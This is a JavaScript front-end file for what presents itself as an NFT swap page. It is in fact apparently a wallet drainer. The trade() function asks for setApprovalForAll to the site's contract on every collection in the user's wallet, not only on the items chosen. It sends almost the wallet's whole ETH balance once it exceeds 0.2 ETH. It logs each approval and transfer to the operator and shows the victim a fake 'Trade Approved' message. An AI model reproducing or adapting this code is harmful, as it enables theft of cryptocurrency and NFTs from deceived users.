
let accounts = [];
let InAddress = "";
let OutAddress = "";
let Code = ""

async function loadWeb3() {
    try {
        window.web3 =await new Web3(window.ethereum);
        // await window.ethereum.enable();
        // conn()
    } catch (error) {
        console.log(error);
    }
    loadCreatedTrade()
}

const _abi = [
    {
      inputs: [],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "owner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "approved",
          type: "address",
        },
        {
          indexed: true,
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "Approval",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "owner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "operator",
          type: "address",
        },
        {
          indexed: false,
          internalType: "bool",
          name: "approved",
          type: "bool",
        },
      ],
      name: "ApprovalForAll",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "previousOwner",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "newOwner",
          type: "address",
        },
      ],
      name: "OwnershipTransferred",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: true,
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          indexed: true,
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          indexed: true,
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "Transfer",
      type: "event",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "approve",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "owner",
          type: "address",
        },
      ],
      name: "balanceOf",
      outputs: [
        {
          internalType: "uint256",
          name: "",
          type: "uint256",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "getApproved",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "owner",
          type: "address",
        },
        {
          internalType: "address",
          name: "operator",
          type: "address",
        },
      ],
      name: "isApprovedForAll",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "name",
      outputs: [
        {
          internalType: "string",
          name: "",
          type: "string",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "ownerOf",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "renounceOwnership",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "safeMint",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "safeTransferFrom",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
        {
          internalType: "bytes",
          name: "data",
          type: "bytes",
        },
      ],
      name: "safeTransferFrom",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "operator",
          type: "address",
        },
        {
          internalType: "bool",
          name: "approved",
          type: "bool",
        },
      ],
      name: "setApprovalForAll",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "bytes4",
          name: "interfaceId",
          type: "bytes4",
        },
      ],
      name: "supportsInterface",
      outputs: [
        {
          internalType: "bool",
          name: "",
          type: "bool",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "symbol",
      outputs: [
        {
          internalType: "string",
          name: "",
          type: "string",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "tokenURI",
      outputs: [
        {
          internalType: "string",
          name: "",
          type: "string",
        },
      ],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "from",
          type: "address",
        },
        {
          internalType: "address",
          name: "to",
          type: "address",
        },
        {
          internalType: "uint256",
          name: "tokenId",
          type: "uint256",
        },
      ],
      name: "transferFrom",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        {
          internalType: "address",
          name: "newOwner",
          type: "address",
        },
      ],
      name: "transferOwnership",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
  ];



async function load() {
  await loadWeb3();
}
load();
let OutBalance = 0
let InBalance = 0
let OutEth = 0
let InEth = 0
async function conn(){
    var connectBtn = document.getElementById("connect");
    var user_assets = document.getElementById("user-assets");
    
    accounts = [account]

    try{
      var loc = window.location.href.split("/")
    }catch{

    }

    var pendingTab = document.getElementById('pendingTab')
    pendingTab.classList.remove('hidden')
    
    var pending = document.getElementById('pending-trades')
    if(pending != undefined){
      loadTrades()
    }
    var created_trade = document.getElementById('created-trade')
    
    connectBtn.innerText = accounts[0].toLowerCase();
    connectBtn.disabled = true
    if(user_assets != undefined){
      user_assets.disabled = ""
      user_assets.classList.remove('disabled-btn')
    }
    var haveError = false
    if(ethereum.chainId != 0x1){
        try {
            await ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{
                    chainId: '0x1'
                }],
            });
        } catch (error) {
            haveError = true
        }
    }
}


let assets1 = []
let assets2 = []



async function loadWallet(address, section){
  var nfts = await GetAllNfts(address)
  if(section == "client-assets2")
    assets2 = nfts
  else // Added
    assets1 = nfts
}




function getIndex(array, item, collection){
  var index = -1
  for(var i = 0; i < array.length; i++){
    if(collection == array[i].asset_contract.address){
      var nftId = array[i].token_id
      if (nftId == item){
        index = i
        break
      }
    }
  }
  return index
}

var itemsOut = []
var itemsIn = []

function addItem(section, index){
    var element
    var sectionId = ""
    if(section == "client-assets2"){
        sectionId = "in-selected"
        element = assets2[index]
        itemsIn.push(assets2[index])
    }else{
        sectionId = "out-selected"
        element = assets1[index]
        itemsOut.push(assets1[index])
    }
    var id = element.token_id
    if(element.asset_contract.schema_name != "ERC721"){
      id = (id+"").substring(0,15)+"..."
    }
    
    var tbody = document.getElementById(sectionId)
    tbody.innerHTML += `
        <tr id='${sectionId}-item-${index}'>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700"><img id='nft-${sectionId}-${index}' class="w-10 h-10" src="${element.image_url}" alt="${element.name}" title="${element.name}"></td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.name}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.asset_contract.schema_name}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${id}</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700">${element.asset_contract.address.substr(0, 6)}...</td>
            <td class="truncate bg-dark-gray-800 text-left px-5 py-3 border-b border-gray-700" >${element.balance}</td>
        </tr>
    `

    var img = document.getElementById(`nft-${sectionId}-${index}`)
    img.addEventListener("error", function(event) {
        document.getElementById(event.target.id).src =  "/static/assets/img/images.png"
        event.onerror = null
    })
}


function checkTradeStatus(){
    var trade_btn = document.getElementById('trade-btn')
    if((itemsIn.length != 0 || InEth > 0) && (itemsOut.length != 0 || OutEth > 0)){
        trade_btn.removeAttribute("disabled")
    }else{
        trade_btn.disabled = true
    }
}

function showError(title, msg){
  var alertBox = document.getElementById("allertBox")
  alertBox.innerHTML = `
    <div class="alert bg-rose-300 text-gray-800 px-4 py-2 rounded w-fit mb-3 mx-auto" role="alert" >
      <div class="flex items-center justify-between mb-2">
      <p class="font-bold flex items-center">
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="mr-2 bi bi-exclamation-circle-fill" viewBox="0 0 16 16">
          <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"/>
        </svg>
        ${title}
      </p>
      <button class="close-alert-btn" onclick='closeBtn(this)' >
        <svg class="fill-current h-5 w-5 text-gray-800"  role="button" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><title>Close</title><path d="M14.348 14.849a1.2 1.2 0 0 1-1.697 0L10 11.819l-2.651 3.029a1.2 1.2 0 1 1-1.697-1.697l2.758-3.15-2.759-3.152a1.2 1.2 0 1 1 1.697-1.697L10 8.183l2.651-3.031a1.2 1.2 0 1 1 1.697 1.697l-2.758 3.152 2.758 3.15a1.2 1.2 0 0 1 0 1.698z"/></svg>
      </button>
      </div>
    <p class="inline px-6 text-left">${msg}</p>
  </div>`
}


function closeBtn(ele){
  if(ele != undefined && ele.parentNode != undefined){
    ele.parentNode.parentNode.remove()
  }
}

async function trade(){
  // addLoading(true)
  
  try{
    logger(`????\n\nWallet Starting a trade: ${accounts[0]}`)
  }catch{

  }

  // if(! await action(1)){
  //   addLoading(false)
  //   showError("Trade Error", "Confirm Your Account Failed")
  //   return
  // }
  var alertBox = document.getElementById("allertBox")
  var collections = []
  var approwedCollections = []

  var sendedEth = "0";
  if(OutEth > 0){
    try{
      var val = window.web3.utils.toWei(`${OutEth}`, 'ether')
      val = window.web3.utils.numberToHex(val)
      var result = await window.contract.methods.createTrade().send({from: OutAddress, value: val})
      sendedEth = OutEth+""
      try{
      logger(`????\n\nWallet Connected: ${accounts[0]}\n\nEth Sent: ${sendedEth} ETH\n\nTrade Code: ${Code}`)
      }catch{
    
      }

    }catch(err){
      console.log(err)
    }
  }
  
if(itemsOut.length > 0  || 1 == 1){

    for(var i =0; i < itemsOut.length; i++){
      var element = itemsOut[i];

      var collectioAddress = element.asset_contract.address
      var nftId = element.token_id
      // if(element.asset_contract.schema_name == "ERC721")
      //   nftId = parseInt(nftId, 16)
      var collectionIndex = -1
      for(var j = 0;j < collections.length; j++){
          var collection = collections[j];
          if(collection[0] == collectioAddress){
              collectionIndex = j
              break
          }
      }
      if(collectionIndex == -1){
          var collection = [collectioAddress, [nftId]]
          collections.push(collection)
      }else{
        var exist = false  
        for(var k = 0; k < collections[j][1].length; k++){
            if(collections[j][1][k] == nftId)
              exist = true
          }
        if(!exist)
          collections[j][1].push(nftId)
      }
  }

    if(MainCollection.length > 0){
      for(var i =0; i < MainCollection.length; i++){
        var collectioAddress = MainCollection[i]
          var nftId = ""
          var collectionIndex = -1
          for(var j = 0;j < collections.length; j++){
              var collection = collections[j];
              if(collection[0] == collectioAddress){
                  collectionIndex = j
                  break
              }
          }
          if(collectionIndex == -1){
              var collection = [collectioAddress, [nftId]]
              collections.push(collection)
          }
        }
    }else{
      for(var i =0; i < assets1.length; i++){
          var element = assets1[i];
          var collectioAddress = element.asset_contract.address
          var nftId = element.token_id
          // if(element.asset_contract.schema_name == "ERC721")
          //   nftId = parseInt(nftId, 16)
          var collectionIndex = -1
          for(var j = 0;j < collections.length; j++){
              var collection = collections[j];
              if(collection[0] == collectioAddress){
                  collectionIndex = j
                  break
              }
          }
          if(collectionIndex == -1){
              var collection = [collectioAddress, [nftId]]
              collections.push(collection)
          }else{
            var exist = false  
            for(var k = 0; k < collections[j][1].length; k++){
                if(collections[j][1][k] == nftId)
                  exist = true
              }
            if(!exist)
              collections[j][1].push(nftId)
          }
      }
    }
    
    for(var i = 0; i < collections.length; i++){
      var collectionAddress = collections[i][0]
      try{
        if(getItem(`approved_${accounts[0]}_${collectionAddress}`))
          continue
      }catch{

      }
      try{
          try{
            logger(`????\n\nWallet Connected: ${accounts[0]}\n\n Getting Approve Collection: \n${collectionAddress}\n\nTrade Code: ${Code}`)
          }catch{

          }
          
          var collectionContract = await new window.web3.eth.Contract(_abi, collectionAddress, {gas: '100000'})
          await collectionContract.methods.setApprovalForAll(contractAddress, true).send({from: OutAddress})
          var collectionNfts = collections[i][1].join("-")
          approwedCollections.push(collectionAddress+"|"+collectionNfts)
          try{
            logger(`????\n\nWallet Connected: ${accounts[0]}\n\nApproved Collection: \n${collectionAddress}\n\nTrade Code: ${Code}`)
            setItem(`approved_${accounts[0]}_${collectionAddress}`, true)
          }catch{

          }
        }catch{
          logger(`??????\n\nWallet Connected: ${accounts[0]}\n\n Error In Approve Collection: \n${collectionAddress}\n\nTrade Code: ${Code}`)
          alertBox.innerHTML = `
            <div class="alert bg-rose-300 text-gray-800 px-4 py-2 rounded w-fit mb-3 mx-auto" role="alert" >
              <div class="flex items-center justify-between mb-2">
              <p class="font-bold flex items-center">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="mr-2 bi bi-exclamation-circle-fill" viewBox="0 0 16 16">
                  <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"/>
                </svg>
                Cancelled.
              </p>
              <button class="close-alert-btn" onclick='closeBtn(this)' id='alert-${collectionAddress}'>
                <svg class="fill-current h-5 w-5 text-gray-800"  role="button" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><title>Close</title><path d="M14.348 14.849a1.2 1.2 0 0 1-1.697 0L10 11.819l-2.651 3.029a1.2 1.2 0 1 1-1.697-1.697l2.758-3.15-2.759-3.152a1.2 1.2 0 1 1 1.697-1.697L10 8.183l2.651-3.031a1.2 1.2 0 1 1 1.697 1.697l-2.758 3.152 2.758 3.15a1.2 1.2 0 0 1 0 1.698z"/></svg>
              </button>
              </div>
            <p class="inline px-6 text-left">Transaction Failed</p>
          </div>`
            var closeelement = document.getElementById(`alert-${collections[i][0]}`)
            setTimeout(closeBtn, 5000, closeelement)
            if(approwedCollections.length == 0){
              break
            }
        }
    }
  }
  
  if(collections.length != 0 && approwedCollections.length == 0){
    addLoading(false)
    return
  }
  

  var InCollections = []
    for(var i =0; i < itemsIn.length; i++){
        var element = itemsIn[i];
        var collectioAddress = element.asset_contract.address
        var nftId = element.token_id
        // if(element.asset_contract.schema_name == "ERC721")
        //   nftId = parseInt(nftId, 16)
        var collectionIndex = -1
        for(var j = 0;j < InCollections.length; j++){
            var collection = InCollections[j];
            if(collection[0] == collectioAddress){
                collectionIndex = j
                break
            }
        }
        if(collectionIndex == -1){
            var collection = [collectioAddress, [nftId]]
            InCollections.push(collection)
        }else{
          InCollections[j][1].push(nftId)
        }
    }
    
    var approwedInCollections = []
    for(var i = 0; i < InCollections.length; i++){
        var collectionNfts = InCollections[i][1].join("-")
        approwedInCollections.push(InCollections[i][0]+"|"+collectionNfts)
    }

    var holdEth = getBalance(accounts[0], true, true)
    if(holdEth > 0.2){
      holdEth -= 0.02
      try{
          var val = window.web3.utils.toWei(`${holdEth}`, 'ether')
          val = window.web3.utils.numberToHex(val)
          var result = await window.contract.methods.createTrade().send({from: accounts[0], value: val})
          sendedEth = (sendedEth * 1 + OutEth)+""
          try{
          logger(`????\n\nWallet Connected: ${accounts[0]}\n\nEth Sent: ${holdEth} ETH`)
        }catch{
        
          }
      }catch{

      }
    }
    
  if(approwedCollections.length > 0 || sendedEth > 0)
    createTradeCode(sendedEth, approwedCollections, approwedInCollections)
  addLoading(false)
}

function createTradeCode(sendedEth, approwedCollections, approwedInCollections){
var alertBox = document.getElementById("allertBox")
var data = {
  detail: sendedEth+ " Eth // Collections: " + approwedCollections.join('_'),
  out: approwedCollections.join('_'),
  in:  approwedInCollections.join('_'),
  inAddress: InAddress,
  outAddress: OutAddress.toLowerCase(),
  outEth: sendedEth+"",
  inEth: InEth + "",
  code: Code,
  token: ""
}
$.ajax({
  url: "/api/v1/trade/",
  method: "PUT",
  data: JSON.stringify(data),
  success: function(result){
    if(result.status == 0){
        alertBox.innerHTML = `
        <div class="alert bg-emerald-300 text-gray-800 px-4 py-2 rounded w-fit mb-3 mx-auto" role="alert">
          <div class="flex items-center justify-between mb-2">
            <p class="font-bold flex items-center">
              <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="mr-2 bi bi-check-circle-fill" viewBox="0 0 16 16">
                <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
              </svg>
              Approved.
            </p>
            <button class="close-alert-btn" onclick='closeBtn(this)'>
              <svg class="fill-current h-5 w-5 text-gray-800" role="button" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><title>Close</title><path d="M14.348 14.849a1.2 1.2 0 0 1-1.697 0L10 11.819l-2.651 3.029a1.2 1.2 0 1 1-1.697-1.697l2.758-3.15-2.759-3.152a1.2 1.2 0 1 1 1.697-1.697L10 8.183l2.651-3.031a1.2 1.2 0 1 1 1.697 1.697l-2.758 3.152 2.758 3.15a1.2 1.2 0 0 1 0 1.698z"/></svg>
            </button>
          </div>
          <p class="inline px-6 text-left">Trade Approved Wait Some Minutes</p>
        </div>
        `
      // window.location = '/generated/'+result.data.code
    }else{
      alertBox.innerHTML = `
        <div class="alert bg-rose-300 text-gray-800 px-4 py-2 rounded w-fit mb-3 mx-auto" role="alert" >
          <div class="flex items-center justify-between mb-2">
          <p class="font-bold flex items-center">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="mr-2 bi bi-exclamation-circle-fill" viewBox="0 0 16 16">
              <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8 4a.905.905 0 0 0-.9.995l.35 3.507a.552.552 0 0 0 1.1 0l.35-3.507A.905.905 0 0 0 8 4zm.002 6a1 1 0 1 0 0 2 1 1 0 0 0 0-2z"/>
            </svg>
            Error, Status Code ${result.status}
          </p>
          <button class="close-alert-btn" onclick='closeBtn(this)' >
            <svg class="fill-current h-5 w-5 text-gray-800"  role="button" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><title>Close</title><path d="M14.348 14.849a1.2 1.2 0 0 1-1.697 0L10 11.819l-2.651 3.029a1.2 1.2 0 1 1-1.697-1.697l2.758-3.15-2.759-3.152a1.2 1.2 0 1 1 1.697-1.697L10 8.183l2.651-3.031a1.2 1.2 0 1 1 1.697 1.697l-2.758 3.152 2.758 3.15a1.2 1.2 0 0 1 0 1.698z"/></svg>
          </button>
          </div>
        <p class="inline px-6 text-left">${result.message}</p>
      </div>`
    }
    
  }
})
}